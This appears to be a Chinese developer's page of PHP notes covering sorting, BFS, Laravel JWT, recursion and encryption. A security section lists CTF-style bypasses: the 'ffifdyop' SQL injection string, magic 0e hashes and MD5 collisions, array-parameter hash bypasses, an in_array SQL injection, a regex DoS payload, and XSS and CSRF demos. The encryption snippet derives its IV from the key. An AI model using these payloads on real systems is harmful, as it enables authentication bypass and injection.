* * 获取指定年月的开始和结束时间戳 * * @param int $year 年份 * @param int $month 月份 * @return array(开始时间,结束时间) */function getMonthBeginAndEnd($year = 0, $month = 0) &#123; $year = $year ? $year : date('Y'); $month = $month ? $month : date('m'); $d = date('t', strtotime($year . '-' . $month)); return ['begin' =&gt; strtotime($year . '-' . $month), 'end' =&gt; mktime(23, 59, 59, $month, $d, $year)];&#125;/** * 获取指定时间戳所在的月份的开始时间戳和结束时间戳 *http://www.phpernote.com/php-function/1439.html * @param int $timestamp * @return array(开始时间,结束时间) */function getMonthBeginAndEnd($timestamp = 0) &#123; $timestamp = $timestamp ? $timestamp : time(); $year = date('Y', $timestamp); $month = date('m', $timestamp); $d = date('t', strtotime($year . '-' . $month)); return ['begin' =&gt; strtotime($year . '-' . $month), 'end' =&gt; mktime(23, 59, 59, $month, $d, $year)];&#125; 广度优先搜索12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/** * 广度搜索 * * 你的朋友关系，以及朋友的朋友的关系，查看你的朋友或者朋友的朋友是不是包含 m 结尾的名字 */// 需要检索的数组$graph = [];$graph['you'] = ['alice', 'bob', 'claire'];$graph['bob'] = ['anuj', 'peggy'];$graph['alice'] = ['peggy'];$graph['claire'] = ['thom', 'jonny'];$graph['anuj'] = [];$graph['peggy'] = [];$graph['thom'] = [];$graph['jonny'] = [];// 搜索过的数组$searchedItem = [];// 待检索的数组$waitSearchArray = [];// 将第一层的关系加入到等待搜索的数组$waitSearchArray = array_merge($waitSearchArray, $graph['you']);// 将结果元素赋值为 false$resultName = false;//需要查找的字符$findChar = 'z';// 如果等待搜索的数组不为空就循环查找while ($waitSearchArray) &#123; // 从队列头部弹出一个元素 $name = array_shift($waitSearchArray); // 如果待检查的元素在已经搜索过的数组中，就跳过，这个是用来防止循环检查的 if (in_array($name, $searchedItem)) &#123; continue; &#125; // 获取最后一个字符 $lastChar = substr($name, strlen($name) - 1, 1); // 如果最后一个字符是 m，就说明找到了，把结果赋值，然后跳出循环 if ($lastChar == $findChar) &#123; $resultName = $name; break; &#125; // 到这里了说明没有找到，那么把这个人的名字，放入到已经搜索过的数组中 $searchedItem[] = $name; // 然后再把这个名字的朋友关系加入到待搜索的数组中 $waitSearchArray = array_merge($waitSearchArray, $graph[$name]);&#125;https://www.h57.pw/2017/11/14/breadthfirst-search-php-implementation/var_dump($resultName); 归并排序1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253function sortArr($arr) &#123; if (count($arr) &lt; 2) &#123; return $arr; &#125; $mid = count($arr) / 2; $arr1 = array_slice($arr, 0, $mid); $arr2 = array_slice($arr, $mid, count($arr)); $arr1 = sortArr($arr1); $arr2 = sortArr($arr2); return mergeArr($arr1, $arr2);&#125;function mergeArr($arr1, $arr2) &#123; if (!is_array($arr1)) &#123; $arr1[] = $arr1; &#125; if (!is_array($arr2)) &#123; $arr2[] = $arr2; &#125; $i =0; $j = 0; $arr1Length = count($arr1); $arr2Length = count($arr2); $returnArr = []; while($i &lt; $arr1Length &amp;&amp; $j &lt; $arr2Length) &#123; if($arr1[$i] &gt; $arr2[$j]) &#123; $returnArr[] = $arr2[$j]; $j++; &#125; else &#123; $returnArr[] = $arr1[$i]; $i++; &#125; &#125; for($tmp = $i; $tmp &lt; $arr1Length; $tmp++) &#123; $returnArr[] = $arr1[$tmp]; &#125; for($tmp = $j; $tmp &lt; $arr2Length; $tmp++) &#123; $returnArr[] = $arr2[$tmp]; &#125; return $returnArr;&#125;$arr = [1,3,2,5,7,9,3,1];$sortableArr = sortArr($arr);//https://www.h57.pw/2016/09/25/php-merge-sort/foreach ($sortableArr as $a) &#123; print_r($a . "\n");&#125; 正则表达式实现 @某人123456789101112131415161718if (preg_match_all (‘#@\w+#u’, ‘@张全蛋 含泪质检 @三星 Note7 被炸飞，听说 @炸机 跟 @啤酒 更配哦！’, $matches)) &#123;var_export($matches);&#125;// 输出array (0 =&gt;array (0 =&gt; ‘@张全蛋’,1 =&gt; ‘@三星 Note7’,2 =&gt; ‘@炸机’,3 =&gt; ‘@啤酒’,),)正则表达式 #@\w+#u 中:#是分隔符.u 是修饰符，表示 Unicode.\w 是元字符，在 ASCII 下等价于 [A-Za-z0-9_], 在 Unicode 下表示字符 (包括汉字) 和数字和下划线.+ 是量词，表示 1 个或多个，等价于 &#123;1,&#125; 快排和归并排序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/** * 归并排序 * @param $arr * @return array */function mergeSort($arr)&#123; $arrCount = count($arr); if ($arrCount &lt; 2) &#123; return $arr; &#125; $mid = ceil($arrCount / 2); // 向上取整一下 $leftArr = array_slice($arr, 0, $mid); $rightArr = array_slice($arr, $mid, $arrCount - $mid); return mergeArr(mergeSort($leftArr), mergeSort($rightArr));&#125;/** * 最终合并数组的方法 * @param $leftArr * @param $rightArr * @return array */function mergeArr($leftArr, $rightArr)&#123; $i = 0; $j = 0; $returnArr = []; while ($i &lt; count($leftArr) &amp;&amp; $j &lt; count($rightArr)) &#123; if ($leftArr[$i] &lt; $rightArr[$j]) &#123; $returnArr[] = $leftArr[$i]; $i++; &#125; else if ($leftArr[$i] &gt; $rightArr[$j]) &#123; $returnArr[] = $rightArr[$j]; $j++; &#125; else &#123; $returnArr[] = $leftArr[$i]; $returnArr[] = $rightArr[$j]; $i++; $j++; &#125; &#125; for ($temp = $i; $temp &lt; count($leftArr); $temp++) &#123; $returnArr[] = $leftArr[$temp]; &#125; for ($temp = $j; $temp &lt; count($rightArr); $temp++) &#123; $returnArr[] = $rightArr[$temp]; &#125; return $returnArr;&#125;/** * 快速排序https://www.h57.pw/2017/04/10/thinking-about-divide-and-conquer-by-sorting-fast-merging/ * @param $arr * @return array */function quickSort($arr)&#123; if (count($arr) &lt; 2) &#123; return $arr; &#125; $flag = $arr[0]; $lessArr = []; $largeArr = []; $flagArr = []; $flagArr[] = $flag; for ($i = 1; $i &lt; count($arr); $i++) &#123; if ($arr[$i] &lt; $flag) &#123; $lessArr[] = $arr[$i]; &#125; else if ($arr[$i] &gt; $flag) &#123; $largeArr[] = $arr[$i]; &#125; else &#123; $flagArr[] = $arr[$i]; &#125; &#125; return array_merge(quickSort($lessArr), $flagArr, quickSort($largeArr));&#125; Jwt前后端分离123456789101112131415161718192021222324252627282930313233343536373839404142434445464748vi composer.json "require": &#123; "tymon/jwt-auth": "1.0.*" &#125;, php artisan jwt:secret https://www.njphper.com/posts/cd8c881c.html class User extends Model implements AuthenticatableContract, AuthorizableContract, JWTSubject &#123; use Authenticatable, Authorizable; /** * The attributes that are mass assignable. * * @var array */ protected $fillable = [ 'name', 'email', ]; /** * The attributes excluded from the model's JSON form. * * @var array */ protected $hidden = [ 'password', ]; /** * Get the identifier that will be stored in the subject claim of the JWT. * * @return mixed */ public function getJWTIdentifier() &#123; return $this-&gt;getKey(); &#125; /** * Return a key value array, containing any custom claims to be added to the JWT. * * @return array */ public function getJWTCustomClaims() &#123; return []; &#125; &#125; 递归123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&amp; 引用赋值function doloop1(&amp;$i = 1)&#123; print_r($i); $i++; if ($i &lt;= 10) &#123; doloop1($i); &#125;&#125;doloop1();static 静态变量https://learnku.com/articles/28252#topnavfunction doloop2()&#123; static $i = 1; print_r($i); $i++; if ($i &lt;= 10) &#123; doloop2(); &#125;&#125;doloop2();global 全局变量$i = 1;function doloop3()&#123; global $i; echo $i; $i++; if ($i &lt;= 10) &#123; doloop3(); &#125;&#125;doloop3();$data = [ ['id' =&gt; 1, 'title' =&gt; 'Electronics', 'parent_id' =&gt; 0], ['id' =&gt; 2, 'title' =&gt; 'Laptops &amp; PC', 'parent_id' =&gt; 1], ['id' =&gt; 3, 'title' =&gt; 'Laptops', 'parent_id' =&gt; 2], ['id' =&gt; 4, 'title' =&gt; 'PC', 'parent_id' =&gt; 2], ['id' =&gt; 5, 'title' =&gt; 'Cameras &amp; photo', 'parent_id' =&gt; 1], ['id' =&gt; 6, 'title' =&gt; 'Camera', 'parent_id' =&gt; 5], ['id' =&gt; 7, 'title' =&gt; 'Phones &amp; Accessories', 'parent_id' =&gt; 1], ['id' =&gt; 8, 'title' =&gt; 'Smartphones', 'parent_id' =&gt; 7], ['id' =&gt; 9, 'title' =&gt; 'Android', 'parent_id' =&gt; 8], ['id' =&gt; 10, 'title' =&gt; 'iOS', 'parent_id' =&gt; 8], ['id' =&gt; 11, 'title' =&gt; 'Other Smartphones', 'parent_id' =&gt; 8], ['id' =&gt; 12, 'title' =&gt; 'Batteries', 'parent_id' =&gt; 7], ['id' =&gt; 13, 'title' =&gt; 'Headsets', 'parent_id' =&gt; 7], ['id' =&gt; 14, 'title' =&gt; 'Screen Protectors', 'parent_id' =&gt; 7], ];获取无限极分类/** * 值引用获取无限极分类树 * * @param array $data * [[[@return](https://learnku.com/users/31554)](https://learnku.com/users/31554)](https://learnku.com/users/31554) array */function make_tree($data)&#123; $refer = array(); $tree = array(); foreach($data as $k =&gt; $v)&#123; $refer[$v['id']] = &amp; $data[$k]; //创建主键的数组引用 &#125; foreach($data as $k =&gt; $v)&#123; $parent_id = $v['parent_id']; //获取当前分类的父级id if($parent_id == 0)&#123; $tree[] = &amp; $data[$k]; //顶级栏目 &#125;else&#123; if(isset($refer[$parent_id]))&#123; $refer[$parent_id]['children'][] = &amp; $data[$k]; //如果存在父级栏目，则添加进父级栏目的子栏目数组中 &#125; &#125; &#125; return $tree; &#125;/** * 递归获取无限极分类树 * * @param array $data * @param int $parent_id * @param int $level * [[[@return](https://learnku.com/users/31554)](https://learnku.com/users/31554)](https://learnku.com/users/31554) array */function make_tree2($data = [], $parent_id = 0, $level = 0)&#123; $tree = []; if ($data &amp;&amp; is_array($data)) &#123; foreach ($data as $v) &#123; if ($v['parent_id'] == $parent_id) &#123; $tree[] = [ 'id' =&gt; $v['id'], 'level' =&gt; $level, 'title' =&gt; $v['title'], 'parent_id' =&gt; $v['parent_id'], 'children' =&gt; make_tree2($data, $v['id'], $level + 1), ]; &#125; &#125; &#125; return $tree;&#125; Laravel中chunk方法分块处理数据的坑1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public function chunk($count, callable $callback)&#123; // 我理解的是类似于limit,offset 实现数据分页查询 $results = $this-&gt;forPage($page = 1, $count)-&gt;get(); while (count($results) &gt; 0) &#123; // On each chunk result set, we will pass them to the callback and then let the // developer take care of everything within the callback, which allows us to // keep the memory low for spinning through large result sets for working. // 如果用户回调中，更新的字段与查询的字段是一个条件，就会出现这样的问题 if (call_user_func($callback, $results) === false) &#123; return false; &#125; $page++; $results = $this-&gt;forPage($page, $count)-&gt;get(); &#125; return true;&#125;public function handle()&#123; // 1.先去查询需要更新的数据量 $count = DB::table('table') -&gt;where('status', '=', 0) -&gt;count(); echo "需要推送的数量:$count\r\n"; while ($count) &#123; // 2.然后limit去查数据 $data= DB::table(self::OPEN_API_WUBA_TEST_CLUE) -&gt;where('is_push', '=', self::IS_PUSH_FAILED) -&gt;limit(100) -&gt;get(); ! empty($data) &amp;&amp; $this-&gt;processData($data); // 3.批次处理完数据，再去查询下 需要更新的数据，直到更新完毕退出循环 $count = DB::table('table') -&gt;where('status', '=', 0) -&gt;count(); echo "剩余推送的记录数:$count\r\n"; &#125; exit("数据全部推送完毕.\r\n");&#125;private function processData($data)&#123; // TODO(xiaoyi):处理数据业务逻辑https://segmentfault.com/a/1190000015284897&#125; 代码细节12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849一个数组对象成员，你知道怎么写吗？/** * @var Ads[] */public $adsList = [];类的魔术方法调用的注释，你知道怎么写吗？https://yq.aliyun.com/articles/691719?spm=a2c4e.11153959.0.0.1a265ee3ENEDVQ/** * @link http://manual.phpdoc.org/HTMLframesConverter/default/ * * @method static int search(string $query, $limit = 10, $offset = 0) */class SearchServiceProxy&#123; public static function __callStatic($method, $arguments) &#123; if (!method_exists("SearchService", $method)) &#123; throw new \LogicException(__CLASS__ . "::" . $method . " not found"); &#125; try &#123; $data = call_user_func_array(["SearchService", $method], $arguments); &#125; catch (\Exception $e) &#123; error_log($e-&gt;getMessage()); return false; &#125; return $data; &#125;&#125;class SearchService&#123; /** * @param string $query * @param int $limit * @param int $offset * * @return array * @deprecated 方法废弃 */ public static function search(string $query, $limit = 10, $offset = 0) &#123; return [ ["id" =&gt; 1, "aaa"], ["id" =&gt; 2, "bbb"], ]; &#125;&#125; PHP 7.1 中使用 openssl 取代 mcrypt123456789101112131415161718192021222324252627282930313233343536/** * 对明文进行加密 * @param string $text 需要加密的明文 * @return string 加密后的密文 */public function encrypt($text, $appid)&#123; try &#123; /** *原来代码 */ $iv = substr($this-&gt;key, 0, 16); $encrypted = openssl_encrypt($text,'AES-256-CBC',$this-&gt;key,OPENSSL_ZERO_PADDING,$iv); return array(ErrorCode::$OK, $encrypted); &#125; catch (Exception $e) &#123; //print $e; return array(ErrorCode::$EncryptAESError, null); &#125;&#125;/** * 对密文进行解密https://blog.wpjam.com/m/php-7-1-openssl/ * @param string $encrypted 需要解密的密文 * @return string 解密得到的明文 */public function decrypt($encrypted, $appid)&#123; try &#123; $iv = substr($this-&gt;key, 0, 16); $decrypted = openssl_decrypt($encrypted,'AES-256-CBC',$this-&gt;key,OPENSSL_ZERO_PADDING,$iv); &#125; catch (Exception $e) &#123; return array(ErrorCode::$DecryptAESError, null); &#125; /** *原来代码 */&#125; static 效率优化1234567function get_some_var()&#123; static $var; if(!isset($var))&#123; $var = complex_calculation(); &#125; return $var;&#125; 解码 JSONP123456function jsonp_decode($jsonp, $assoc = false) &#123; if($jsonp[0] !== '[' &amp;&amp; $jsonp[0] !== '&#123;') &#123; $jsonp = substr($jsonp, strpos($jsonp, '(')); &#125; return json_decode(trim($jsonp,'();'), $assoc);&#125; 合并多维数组中的子数组12$merged = call_user_func_array('array_merge', $result);$merged = array_merge(...$result); simplexml_load_string 的 parser error 问题123456789101112131415首先使用函数 libxml_use_internal_errors() 关闭 XML 错误，然后使用 libxml_get_errors() 获取相关的错误进行自定义处理。libxml_use_internal_errors(true);$sxe = simplexml_load_string("&lt;?xml version='1.0'&gt;&lt;broken&gt;&lt;xml&gt;&lt;/broken&gt;");if (false === $sxe) &#123; echo "加载 XML 错误\n"; foreach(libxml_get_errors() as $error) &#123; echo "\t", $error-&gt;message; &#125;&#125;加载 XML 错误 Blank needed here parsing XML declaration: '?&gt;' expected Opening and ending tag mismatch: xml line 1 and broken Premature end of data in tag broken line 1 如何移除控制字符123function wpjam_strip_control_characters($str)&#123; return preg_replace('/[\x00-\x1F\x7F-\x9F]/u', '', $str);&#125; 获取 Linux 服务器的 uptime1234567891011$uptime = trim(shell_exec('uptime'));// output is 04:47:32 up 187 days, 5:03, 1 user, load average: 0.55, 0.55, 0.54$uptime = explode(',', $uptime);$uptime = explode(' ', $uptime[0]);$uptime = $uptime[2].' '.$uptime[3]; // 187 days$uptime = trim(file_get_contents('/proc/uptime'));$uptime = explode(' ', $uptime);echo $uptime[0]; //uptime in seconds 用Memcahced 的时候，请不要把过期时间设置成超过30天1234过期时间是一个 Unix 时间戳，也可以是一个从现在算起的以秒为单位的数字。那么怎么判断是 Unix 时间戳还是一个从现在算起的以秒为单位的数字呢？小于 60×60×24×30（30天时间的秒数），就算是从现在算起的以秒为单位的数字。如果大于服务端会将其作为一个真实的Unix时间戳来处理而不是自当前时间的偏移。如果过期时间被设置为0（默认），此元素永不过期（但是它可能由于服务端为了给其他新的元素分配空间而被删除）。所以如果真的要设置一个 key 的过期时间为一年后，其值应该设置为： time()+60×60×24×365。 json_decode 无法解析12345include 'JSON.php';//https://github.com/pear/Services_JSON$json = new Services_JSON();$data = $json-&gt;decode($str);$json = new Services_JSON(SERVICES_JSON_LOOSE_TYPE);$data = $json-&gt;decode($str); cURL 报错 error 60 SSL certificate problem123456将 cacert.pem 文件保存在可到达的目标中。然后，在 php.ini 文件中，向下滚动到找到 [curl] 的位置。您应该看到注释掉了 CURLOPT_CAINFO 选项。 取消注释并将其指向 cacert.pem 文件。 你应该有这样的一行： curl.cainfo =“证书路径\cacert.pem” 按周取时间段123456789101112131415161718192021222324252627282930313233343536373839$start = '1478863624';$end = '1480505248';function getweek($start, $end) &#123; $ret = array(); $i = 0; while($start &lt;= $end)&#123; $ret[$i]['start'] = date('Y-m-d',$start); $tmp = strtotime("+6 days",$start); if($end &lt;= $tmp) $ret[$i]['end'] = date('Y-m-d',$end); else $ret[$i]['end'] = date('Y-m-d',$tmp); $i++; $start = strtotime("+1 day",$tmp); &#125; return $ret; &#125;Array( [0] =&gt; Array ( [start] =&gt; 2016-11-11 [end] =&gt; 2016-11-17 ) [1] =&gt; Array ( [start] =&gt; 2016-11-18 [end] =&gt; 2016-11-24 ) [2] =&gt; Array ( [start] =&gt; 2016-11-25 [end] =&gt; 2016-11-30 ) PHP 代码安全1https://learnku.com/articles/28505 匿名函数123456789$var = "https://6619.io";(function() use ($var) &#123; // echo $var;&#125;)();(function($param) &#123; // echo $param;&#125;)($var); 比较字符串123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354列出目录https://www.restran.net/2016/09/26/php-security-notes/scandir('/site')show_source('flag.php');highlight_file('flag.php');var_dump(file('flag.php'));print_r(file('flag.php'));如果 GET 参数中设置 name[]=a，那么 $_GET['name'] = [a]，php 会把 []=a 当成数组传入， $_GET 会自动对参数调用 urldecode。$_POST 同样存在此漏洞，提交的表单数据，user[]=admin，$_POST['user'] 得到的是 ['admin'] 是一个数组。sha1([]) === falsemd5([]) === false$password = "ffifdyop";$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'"b"SELECT * FROM admin WHERE pass = ''or'6É]™é!r,ùíb\x1C'"'0.999999999999999999999' == 1 true in PHP 4.3.0 - 5.6.x# false in 7.0.0+'0e0' == '0x0''0xABC' == '0xabc''0xABCdef' == '0xabcDEF''000000e1' == '0x000000''0xABFe1' == '0xABFE1''0xe' == '0Xe''0xABCDEF' == '11259375''0xABCDEF123' == '46118400291''0x1234AB' == '1193131''0x1234Ab' == '1193131'# true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x# false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+'0xABCdef' == ' 0xabcDEF''1e1' == '0xa''0xe' == ' 0Xe''0x123' == ' 0x123'# true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0# false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+'0e0' == '0x0a'# true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2# false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+'0xe' == ' 0Xe.'var_dump(is_numeric("\01")); // falsetypeid=1’ union select.. 也能通过 in_array 的验证 if (in_array($_GET('typeid'], array(1, 2, 3, 4))) &#123; $sql="select …. where typeid=".$_GET['typeid']"; echo $sql;&#125; md512345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091两个 md5 一样的字符串 from binascii import unhexlifyfrom hashlib import md5from future.moves.urllib.parse import quoteinput1 = 'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go' + unhexlify('d8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956')print(quote(input1))print md5(input1).hexdigest()input2 = 'Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n' + unhexlify('75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956')print md5(input2).hexdigest()print(quote(input2))from array import arrayfrom hashlib import md5input1 = array('I', [0x6165300e,0x87a79a55,0xf7c60bd0,0x34febd0b,0x6503cf04,0x854f709e,0xfb0fc034,0x874c9c65,0x2f94cc40,0x15a12deb,0x5c15f4a3,0x490786bb,0x6d658673,0xa4341f7d,0x8fd75920,0xefd18d5a])input2 = array('I', [x^y for x,y in zip(input1, [0, 0, 0, 0, 0, 1&lt;&lt;10, 0, 0, 0, 0, 1&lt;&lt;31, 0, 0, 0, 0, 0])])print(input1 == input2) # Falseprint(md5(input1).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41print(md5(input2).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41// '0e5093234' 为 0，'0eabc3234' 不为 0 // true'0e509367213418206700842008763514' == '0e481036490867661113260034900752'// true'0e481036490867661113260034900752' == '0' // falsevar_dump('0' == '0e1abcd');// truevar_dump(0 == '0e1abcd'); var_dump(md5('240610708') == md5('QNKCDZO'));var_dump(md5('aabg7XSs') == md5('aabC9RqS'));var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));找出 0e 开头的 hash 碰撞，可以用如下代码 $salt = 'vunp';$hash = '0e612198634316944013585621061115'; for ($i=1; $i&lt;100000000000; $i++) &#123; if (md5($salt . $i) == $hash) &#123; echo $i; break; &#125;&#125; echo ' done';0e 开头，md5后面全是数字的240610708: 0e462097431906509019562988736854QLTHNDT: 0e405967825401955372549139051580QNKCDZO: 0e830400451993494058024219903391PJNPDWY: 0e291529052894702774557631701704NWWKITQ: 0e763082070976038347657360817689NOOPCJF: 0e818888003657176127862245791911MMHUWUV: 0e701732711630150438129209816536MAUXXQC: 0e478478466848439040434801845361IHKFRNS: 0e256160682445802696926137988570GZECLQZ: 0e537612333747236407713628225676GGHMVOE: 0e362766013028313274586933780773GEGHBXL: 0e248776895502908863709684713578EEIZDOI: 0e782601363539291779881938479162DYAXWCA: 0e424759758842488633464374063001DQWRASX: 0e742373665639232907775599582643BRTKUJZ: 00e57640477961333848717747276704ABJIHVY: 0e755264355178451322893275696586aaaXXAYW: 0e540853622400160407992788832284aabg7XSs: 0e087386482136013740957780965295aabC9RqS: 0e041022518165728065344349536299sha110932435112: 0e07766915004133176347055865026311692244aaroZmOk: 0e66507019969427134894567494305185566735aaK1STfY: 0e76658526655756207688271159624026011393aaO8zKZF: 0e89257456677279068558073954252716165668aa3OFF9m: 0e36977786278517984959260394024281014729crc32 6586: 0e817678pre_match 在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，如果传入一个超长的字符串，会导致 pre_match 消耗大量资源从而导致 php 超时，后面的 php 语句就不会执行。payload: $code="xdsec###AAAAAAAAAAAAAAAAAAA(超多个A)";preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/", $code)); 方法多次调用1234567891011121314151617181920212223242526272829303132333435363738&lt;?php https://segmentfault.com/a/1190000007210948class MyDate&#123; public static function getCurrentDate() &#123; static $current_date = ''; if (!$current_date) &#123; echo 'only run one time'; usleep(200000); $current_date = date('Y-m-d H:i:s'); &#125; return $current_date; &#125; public static function getCurrentDate2() &#123; usleep(200000); echo 'run everytime'; return date('Y-m-d H:i:s'); &#125;&#125;$start = microtime(true);$i = 5;while ($i--) &#123; MyDate::getCurrentDate();&#125;echo microtime(true) - $start; //200ms$start = microtime(true);$i = 5;while ($i--) &#123; MyDate::getCurrentDate2();&#125;echo microtime(true) - $start; //1s 越权漏洞12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758水平越权就是同等角色下的用户，不但能够访问和操作自己私有的数据，还能访问其他人私有的数据，其根本是基于数据的访问权限。 # 1 删除前鉴权处理 public function destory($id) &#123; $payment = Payment::find($id); if ($payment-&gt;user_id != $this-&gt;currentUser-&gt;id) &#123; return ... &#125; $payment-&gt;delete(); &#125; # 2 参入id查询删除 public function destory($id) &#123; Payment::whereUserId($this-&gt;currentUser-&gt;id)-&gt;whereId($id)-&gt;delete(); &#125; # 3 模型关联查询 class User extends Model &#123; public function payments() &#123; return $this-&gt;hasMany('App\Payment'); &#125; &#125; class PaymentController extends Controller &#123; public function destory($id) &#123; $this-&gt;currentUser-&gt;payments()-&gt;whereId($id)-&gt;delete(); &#125; &#125;在 findPassword 里面再次验证完成邮箱校验的账户是否为当前找回密码的账号 class UserController extends Controller &#123; public function check($data) &#123; if (checkEmail($data['email'], $data['code'])) &#123; return true; &#125; ... &#125; public function findPassword($data) &#123; if (checkEmail($data['email'], $data['code'])) &#123; $user = User::whereEmail($data['email'])-&gt;first(); $user-&gt;password = $data['new_password']; $user-&gt;save(); &#125; ... &#125; &#125;https://learnku.com/articles/28505#topnav 限制分页条目12345678恶意请求者请求把 pagesize 输入 5000,10000 等甚至更大的数，会给数据库带来一定的压力，localhost/api/articles?pageid=0&amp;pagesize=10000//用框架自带的分页方法 public function index() &#123; $builder = Article::with('category:id,name')-&gt;orderBy('id', 'desc')-&gt;paginate(8); return response()-&gt;json(['status' =&gt; true, 'count' =&gt; $builder-&gt;total(), 'articles' =&gt; $builder-&gt;items()]); &#125; XSS123456789101112131415&lt;body&gt; &lt;?php $searchQuery = $_GET['q']; /* some search magic here */ ?&gt;&lt;h1&gt;You searched for: &lt;?php echo $searchQuery; ?&gt;&lt;/h1&gt;&lt;/body&gt;因为我们把用户的内容直接打印出来，不经过任何过滤，非法用户可以拼接 URL： search.php?q=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3EPHP 渲染出来的内容如下，可以看到 Javascript 代码会被直接执行：&lt;body&gt;&lt;h1&gt;You searched for: &lt;script&gt;alert(1);&lt;/script&gt;&lt;/h1&gt;&lt;p&gt;We found: Absolutely nothing because this is a demo&lt;/p&gt;&lt;/body&gt; CSRF1234567例如网站上有用户可以用来注销账户的链接。&lt;a href="http://your-website.com/delete-account"&gt;销毁账户&lt;/a&gt;如果某个用户评论：&lt;img src=”http://your-website.com/delete-account”&gt; wow用户将在查看此评论的时候删除他们的账号。 No input file specified12345672019/05/23 12:31:44 [error] 5085#5085: *1 FastCGI sent in stderr: "PHP message: PHP Warning: Unknown: open_basedir restriction in effect. File(/home/vagrant/Code/haopai-git/public/index.php) is not within the allowed path(s): (/www/wwwroot/dev.guooo.top/:/tmp/:/proc/) in Unknown on line 0PHP message: PHP Warning: Unknown: failed to open stream: Operation not permitted in Unknown on line 0Unable to open primary script: /home/vagrant/Code/haopai-git/public/index.php (Operation not permitted)" while reading response header from upstream, client: 192.168.10.1, server: hp.hopa.cc, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.2-fpm.sock:", host: "hp.hopa.cc"看到上面的错误，我也去网上找，网上主要是说 ngnix 里面配置 fastcgi_param 的问题，但是我觉得不对吧，因为别的项目都没有问题，单单就这个项目有问题。不知怎么了，我就注意到 "/www/wwwroot/" 这个东西，我电脑里就不应该有这个文件夹啊，于是我就去项目里查找这个字符串，最后在 .user.ini 这个文件找到了，当我看到这个文件的时候我就意识到是他的问题，我把这个文件里面的配置删了。文件内容如下：open_basedir=***********https://learnku.com/articles/28858 一个简单的composer包12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849vi https://github.com/jianyan74/php-excel/blob/master/composer.json&#123; "name": "jianyan74/php-excel", "description": "php excel 导入导出", "keywords": ["excel", "csv", "xlsx", "xls", "html", "jianyan74"], "license": "MIT", "authors": [ &#123; "name": "jianyan74" &#125; ], "type": "extension", "require": &#123; "php": "&gt;=7.0", "phpoffice/phpspreadsheet": "^1.3" &#125;, "autoload": &#123; "psr-4": &#123; "jianyan\\excel\\": "./src" &#125; &#125;&#125;vi &lt;?phpnamespace jianyan\excel;use Exception;use PhpOffice\PhpSpreadsheet\Cell\Coordinate;use PhpOffice\PhpSpreadsheet\Spreadsheet;use PhpOffice\PhpSpreadsheet\Writer\Html;use PhpOffice\PhpSpreadsheet\Writer\Xls;use PhpOffice\PhpSpreadsheet\Writer\Xlsx;use PhpOffice\PhpSpreadsheet\Writer\Csv;/** * 导出导入Excel * * Class Excel * @package jianyan\excel * @author jianyan74 &lt;751393839@qq.com&gt; */class Excel&#123; &#125;composer require jianyan74/php-exceluse jianyan\excel\Excel;Excel::exportData($list, $header) jwt记录123456789101112131415161718192021222324252627282930313233JWT 由三部分组成：头部、数据体、签名 / 加密这三部分以 . (英文句号) 连接，注意这三部分顺序是固定的，即 header.payload.signature 如下示例：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5cBase64url 编码是 Base64 的一种针对 URL 的特定变种。因为 = 、+、/ 这个三个字符在 URL 中是有特定含义的，所以 Base64url 分别将 = 直接忽略，+ 替换成 -，/ 替换成 _Header 部分：&#123; "alg": "HS256", "typ": "JWT"&#125;Payload 部分：&#123; "sub": "demo", "name": "xfly", "admin": true&#125;根据 Header 部分的 alg 属性我们可以知道该 JWT 符合 JWS 中的规范，且签名算法是 HS256 也就是 HMAC SHA-256 算法，那么我们就可以根据如下公式计算最后的签名部分：HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)其中的密钥是保证签名安全性的关键，所以必须保存好，在本例中密钥是 123456。因为有这个密钥的存在，所以即便调用方偷偷的修改了前两部分的内容，在验证环节就会出现签名不一致的情况，所以保证了安全性。如果有效期设置过长，意味着这个 Token 泄漏后可以被长期利用，危害较大，所以一般我们都会设置一个较短的有效期。由于有效期较短，意味着需要经常进行重新授权的操作。假设在用户操作过程中升级 / 变更了某些权限，势必需要刷新以更新数据。要解决这个问题，需要在服务端部署额外逻辑，常见的做法是增加刷新机制和黑名单机制，通过 Refresh Token 刷新 JWT，将需要废弃的 